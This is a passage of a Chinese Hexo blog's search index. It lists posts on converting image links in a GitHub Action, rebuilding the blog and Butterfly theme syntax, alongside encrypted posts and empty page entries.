9b754675916045eb14e04e8702cfded3581976327c90d465611e07e03a7073f076c421040eb655057fd098c50116b54f525f22c8b0218b2fa5120e6c5407a7fabb95bc3a9ab511239d6b4d896feba49836b8e68b45d7d34272207c35c7b074f66be4d0fc665bdd7a15e48bdc82f0fe807c8bed1b0c55c98a111625d4ab92ded2a45551ffea9cb37fcddde5731e686594aee6b0a6c578b17a100cf3c4141350d5b2174813c71cd5885a96fd5837421ff1370bed9746e8895bd0de7c4ce1dfae2d109d74b11c388be251e4c60f89cd6adb773a136827f4548d3c9a278fcbcd9192baa70f8e903e5bc4d20a6f857f2f5fb7ed0dbaedab7859b1cec328ab65be7a2ef9e2baa9f0a95023a0ac4bbc7a4ecc2943ac5516bb7974a72cc3ec407f6d7f7f54655cf2092e61a8a6c76c57c9ecb4953b76ddaa817da29add484f9bc9df2870ef38bffe3013806da13c0a2cab720eea2dd3b59b798ff0e33342eadad65932a90d5aa061011dc6ed4ccb6291dd5b17258d402cd0d9ad1b7781751e269f5c9cd89ce4a6fa7448a65fcb4da19bdd518595cf8b5ebeb323ae2190315cebe7b579b8067ad2dd8ddce54f213197eec047bf3c261226f6019d6ba120e362bd7263e941197571726b7877f5ee9a3ea013efd3f1bce7905ec98e9c8b2d8fd7d7a0a2338f1fa42480d477ef42a8e5b3bc21647418a3fae48dac7fa7a7e4ff7ff36e55ab1b92495ca6b864ba9b7f48622c038406da158e56155b86e2dc7f5c3118ca22431f477cff1a2706c1ff0b3cb2961d552024ff83b80d9d82e976881e82e8eea3b78c0e8bfc642901d6cfdd55ba8c29bb211ec3b5bdebbe8ea13c3468c141aa61999cfac38ac287f5961a44681b14c4c28b2ed1c71ee862c30bcc811e040cba18e292c084f3c5d898564d1434d2de86cd45fba2190864cbed6ae98411159c72dd6ffdfff613e61c89e31dfd6966ca125e7200dfffa689aafaaad2f3a0350c6d879588259b10df1507d743a398189161a5c3adc68648c333d5043bb24e8bf989f14afb2a2c089bf223e94907537259f2f03a5de09fd7dea3090501ff671dfcdba729def9b3c4ddd2b2d13315a466227bf4650b4fcca7d1d579dae059358eb2953af72d8393025bb407ac8dbb69fc64cb2b683cc3d1b38f0e24613b1a9304e46e92372a8a883ac1c2350775916809c585a2291681378c6222884c515890deea65027ee40d67f6cf1ceece656bfcd8f96f03b837125f924d53c3ea2503a4770cbdc2cc76c8d9ac5287fbed849c4294d2b8042fe7d057e14bf13d309aa2427563d48074f7815f4c94854323796a32dd889059315e54119f70725d6ae0271297d3cea5176a91d63d971ef1865bec1c27f5fc6ce55f660824c87ee3e42bfa2836b1fd475afeba2e73d37a791b8d706e1b71a78e554499195e0e6803a5ae82e177603d139b38e79fc9e738ac639d78b9c5df9212d5d8d986b94fc413a5e50a52e01f092d5e74aa5c17da4511f99e17dfd97044b8c270d519e7a7843c517cb7007a527a7d9829af2d3bd389954f769a3c8de4a206f6fe38fd960b8855e0fdfc4ff52363afa539cc2a99e02622aa5d408f7701a461032064eab7a8c92fb22d135aec3f2dd1b985d38680b22442067694302d42d5deee8472e8c6d4954777035fb37221208dd00d8d0179fe1fd3439b7291f3b95a71c87f4bd3e6ac03aa2d2d874e5157285473c7790001e3b529c1d0a16c33702a15ae7e0e51872d6d7e90be4bf066407732efe0405f76e6b54bb0d6df37f474a96ff74c796fb1933e4fd68b8b7024eacd6484e21009ee5c8f66a428aeb19b623bc741380e1bb8a1494e93bde91e06938e04a5c42d8769a029bf998f8ea645c3073fc6e40896d78578b63e6eb78cf64e029edf3ffaea9ef06e776f740bd1bbe3d1010f3f79ab36583394463e0e8515692a7f0c29a4304a048615887b229e105f25d2402726f9b9e51c975c1e7f425261522f93cb5016dfbfb118b2af2a210f0b80f8a6c25dbd40cb2967bb863bbd7fb6136493045dfc39e178f42d2aa2adc72d71ea83cad81fa203e2241886aa6b0c8922c96978435944933a9421d062366cff5b0574f5eb37f3b633d2fc1daa84f29f9d38647be21396b02036db5759eddcfae176d5bbd08e995c55e967a9d9487ab20af683ac21fc2324ef59ea2d9ed8798eaa2c21a65875fb61bc125a7efb989d2166dbdf1e7c5fc261f99185527abb6027bd4dd8e583302bb9f2132adb35bcf21c5a1aa38c86b69ff7599ee664ae68ef383d7c72e16ffa8139d6ab59edb87e45f522b91c77a6496d133c2c94be8c997ba109958cfc7e09895a3571e0e08394909a67bcc3bab3c6ab4f86b0e06e18292e0fbc92d2e7c1d099b79e515ae46ce4af4e23261c69c814eaab5119de81bc4cf935b317d1a67034136e094f709cb6f26765fde4d95e4cbdbe8b0e38ffc9205156dbc544bd3a64adc641c529cec0943bacb6ca332b6addb6a533d349216c0dbc514d017d36f68f8aefa5ebbf3099400599b1d003fbaf5eb285bc70fffa64ad7c4698ba6511cf7994da5b56e759e8686e5784183f4be6420de69fecd450fc41661d3c04224355ef314b978bb37c6e60fa303102e9ff1df7a54ef68564af7e0ce054540333ff3e5dd8e7a4efe6b4f3192aabb6ecf89cefae84c97e071081e5861df761afd060a2b7dcb65698fcb9ed85931fab2440f5bafc0dc111de2217b40b72e3f675fe02fa5f66ca520df7991b679827649fefebae11f5891d8a69ed167c1a6e441ea148fb54add8d6f9c91beb7160860cca6b070041336d43f7943f90e3613428335400bc2959dff107ec69f5aa7f84ce795937b95ca35812229a2d50b85cee48fc49d6bd8f7a57eeffada9c4f61bb9be04e06592328b458d84d391270cba8d239b62e3fb74ae8f7959acc926f042dea104619bf372f08495debae6e049f6eecd8d4d60a768258cb7830ddbf554025be76667e0580fe7d4f9619ac7c9cb583bb9639093b7a5579d8f09729d08f88c4ec9999ef22d898f98c0456db8509e3bbc811fd08174a73d696152af8bc9e91d1f2a9f237d5c69eec48750bc89a000e18c3ff06b95745d89d71410c200712a36c89ea232e3a1d60ad85051879f3fab5a7</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数学建模</tag>
      
      <tag>运筹学</tag>
      
      <tag>局部优化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Github-action-Integrate-External-chain-conversion</title>
    <link href="/2020/08/29/Github-action-Integrate-External-chain-conversion_new/"/>
    <url>/2020/08/29/Github-action-Integrate-External-chain-conversion_new/</url>
    
    <content type="html"><![CDATA[<p>这是一次耗时 6 个小时，尝试了 99+次的成果。</p><a id="more"></a><h1 id="外链转换"><a href="#外链转换" class="headerlink" title="外链转换"></a>外链转换</h1><p>对于防盗链功能开启的图片链接，在非可信域下是无法加载的。<br>一个简单的临时解决方案是在 post.pug 模板文件中添加 no-referrence 标签，但这会导致文章阅读量出现显示问题。</p><blockquote><p>我不知道为啥会出现这种 bug</p></blockquote><p>作为一个<del>完美主义者</del>我怎么能忍呢是不是。我在项目作者的 issue 下留了言，他说暂时没有考虑，可以我们在 adapter 层做拓展。我看了一下 js 代码，发现我并不会写啊啊啊啊。然后就萌生了用 python 作为外链转换脚本语言，并放弃了向原作者 pull 的想法。<br>我原先在本地已经写好了一个外链转换的脚本，是对于特定文件夹和其他外链转换成我个人又拍云的外链的脚本。我一开始心想这还不简单，直接把脚本中的保存路径改一下，然后改一下正则匹配不就 ok 了吗。但事实狠狠的打脸。</p><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><ol><li>python2 不支持 urllib？雾<ol><li>替换成 urllib3 并使用 urllib3.PoolManager 创建连接池，进行外链下载</li></ol></li><li>python3.7 不支持 upyun?雾<ol><li>真的坑，由于不能选择 python 版本，导致很多奇奇怪怪的 bug</li></ol></li><li>linux 下中文是乱码的（或者是 ascii 编码，无法用 os.open 中的 encoding 转换成 utf8,而且无法读取中文文件名)<blockquote><p>可能是我姿势不对？</p></blockquote></li></ol><p>a. 解决方法<br>使用英文命名该文件，并使用英文作为文章题目。<br>内部读取文件使用 io.open 并进行编码转换</p><ol start="4"><li>去除外链锚点#符号</li></ol>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>踩坑</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mathematical-modeling-national-competition-drawing-tips</title>
    <link href="/2020/08/27/Mathematical-modeling-national-competition-drawing-tips_new/"/>
    <url>/2020/08/27/Mathematical-modeling-national-competition-drawing-tips_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8ce58538e9e492080b4b59ae4b0d165e6abb003c97c819eaea5365c475b74477"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>绘图</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数模</tag>
      
      <tag>python</tag>
      
      <tag>seaborn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo-rebuilding-records</title>
    <link href="/2020/08/25/hexo-rebuilding-records_new/"/>
    <url>/2020/08/25/hexo-rebuilding-records_new/</url>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="hexo-init-报错"><a href="#hexo-init-报错" class="headerlink" title="hexo init 报错"></a>hexo init 报错</h1><p>是由于无法 ping 通 github.com<br>其实我挂了梯子，但是没有想到学校的网络依旧不能连接通，导致一度以为电脑又出了什么问题。<br>然后我在 ip 网站查到了 github 现在的 ip 解析，然后挑了其中能 ping 通的修改了 host 文件。然后结果还是不行。（或许可以，但是我不知道什么时候好的）<br>然后我就直接在 hexo-starter 那个项目里 git clone 了（因为对比发现是一模一样的）</p><h1 id="hexo-安装-theme"><a href="#hexo-安装-theme" class="headerlink" title="hexo 安装 theme"></a>hexo 安装 theme</h1><p>从 git 仓库中下载<br><a href="https://chenzkun.top/page/2/">https://chenzkun.top/page/2/</a><br><a href="https://blog.flexiston.com/">https://blog.flexiston.com/</a><br>这两位的主题我比较中意，我先挑 butterfly 试一试</p><h1 id="hexo-g"><a href="#hexo-g" class="headerlink" title="hexo g"></a>hexo g</h1><p>下载好 theme 后，需要 hexo g 生成预览<br>（网上教程直接就 hexo s，又走了很多弯路）</p><h1 id="hexo-s"><a href="#hexo-s" class="headerlink" title="hexo s"></a>hexo s</h1><p>预览报错<br>Hexo 启动页面显示 extends includes/layout.pug block content include includes/recent-posts.pug include<br>解决方案<br>npm install –save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive<br>清除缓存<br><code>hexo clean</code><br>生成静态文件即可<br><code>hexo g</code></p><h1 id="butterfly-特别语法"><a href="#butterfly-特别语法" class="headerlink" title="butterfly 特别语法"></a>butterfly 特别语法</h1><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% note default %&#125;<br>default 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note primary no-icon %&#125;<br>primary 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note success %&#125;<br>success 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note info %&#125;<br>info 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note warning %&#125;<br>warning 提示塊標籤<br>&#123;% endnote %&#125;<br>&#123;% note danger %&#125;<br>danger 提示塊標籤<br>&#123;% endnote %&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.hackerjerry.top/hexo-rebuilding-records-1.png#align=left&display=inline&height=323&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=722&size=44261&status=done&style=none&width=361" alt="image.png"></p><div class="note note-primary no-icon">            <p>primary 提示塊標籤</p>          </div><p>##</p><h2 id="Gallery-相册图库"><a href="#Gallery-相册图库" class="headerlink" title="Gallery 相册图库"></a>Gallery 相册图库</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;div class=&quot;gallery-group-main&quot;&gt;<br>&#123;% galleryGroup name description link img-url %&#125;<br>&#123;% galleryGroup name description link img-url %&#125;<br>&#123;% galleryGroup name description link img-url %&#125;<br>&lt;/div&gt;<br>name：图库名字。<br>description：图库描述。<br>link：连接到对应相册的地址。<br>img-url：图库封面的地址。<br>例如<br>&lt;div class=&quot;gallery-group-main&quot;&gt;<br>&#123;% galleryGroup <span class="hljs-string">&#x27;壁紙&#x27;</span> <span class="hljs-string">&#x27;收藏的一些壁紙&#x27;</span> <span class="hljs-string">&#x27;/Gallery/wallpaper&#x27;</span> https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">11</span>/<span class="hljs-number">10</span>/T7Mu8Aod3egmC4Q.png %&#125;<br>&#123;% galleryGroup <span class="hljs-string">&#x27;漫威&#x27;</span> <span class="hljs-string">&#x27;關於漫威的圖片&#x27;</span> <span class="hljs-string">&#x27;/Gallery/marvel&#x27;</span> https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">8</span>t97aVlp4hgyBGu.jpg %&#125;<br>&#123;% galleryGroup <span class="hljs-string">&#x27;OH MY GIRL&#x27;</span> <span class="hljs-string">&#x27;關於OH MY GIRL的圖片&#x27;</span> <span class="hljs-string">&#x27;/Gallery/ohmygirl&#x27;</span> https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/hOqbQ3BIwa6KWpo.jpg %&#125;<br>&lt;/div&gt;<br>区别于旧版的 Gallery 相册，新的 Gallery 相册会自动根据图片长度进行排版，书写也更加方便，与 markdown 格式一样。 可根据需要插入到相应的 md。<br>&#123;% gallery %&#125;<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/Fze9jchtnyJXMHN.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/ryLVePaqkYm4TEK.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/gEy5Zc1Ai6VuO4N.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/d6QHbytlSYO4FBG.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">6</span>nepIJ1xTgufatZ.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/E7Jvr4eIPwUNmzq.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/mh19anwBSWIkGlH.jpg)<br>![](https://i.loli.net/<span class="hljs-number">2019</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2</span>tu9JC8ewpBFagv.jpg)<br>&#123;% endgallery %&#125;<br></code></pre></td></tr></table></figure><h2 id="tag-hide"><a href="#tag-hide" class="headerlink" title="tag-hide"></a>tag-hide</h2><p><img src="https://image.hackerjerry.top/hexo-rebuilding-records-2.png#align=left&display=inline&height=419&margin=%5Bobject%20Object%5D&name=image.png&originHeight=837&originWidth=1072&size=55521&status=done&style=none&width=536" alt="image.png"></p><h2 id="Tabs"><a href="#Tabs" class="headerlink" title="Tabs"></a>Tabs</h2><p><img src="https://image.hackerjerry.top/hexo-rebuilding-records-3.png#align=left&display=inline&height=322&margin=%5Bobject%20Object%5D&name=image.png&originHeight=643&originWidth=691&size=26687&status=done&style=none&width=345.5" alt="image.png"></p><h1 id="theme-文件夹无法-git-push"><a href="#theme-文件夹无法-git-push" class="headerlink" title="theme 文件夹无法 git push"></a>theme 文件夹无法 git push</h1><p><img src="https://image.hackerjerry.top/hexo-rebuilding-records-4.png#align=left&display=inline&height=245&margin=%5Bobject%20Object%5D&name=image.png&originHeight=489&originWidth=961&size=65974&status=done&style=none&width=480.5" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>博客美化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>关于</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>一个在信安路上努力的学生。<br>永远追求卓越，一生报效祖国。</p>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>碎碎念</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<body>        <script>    var appID="dnJxxKN7NzdjD6VqYgzpKbkL-MdYXbMMI";    var appKEY="w2ovxoFD2WXutolExQpi8dRY";    </script>        <div id="artitalk_main"></div>    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/artitalk@2.4.2"></script></body>]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>bangumis</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Categories</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Links</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
  <entry>
    <title>Tags</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[]]></content>
    
  </entry>
  
  
  
</search>
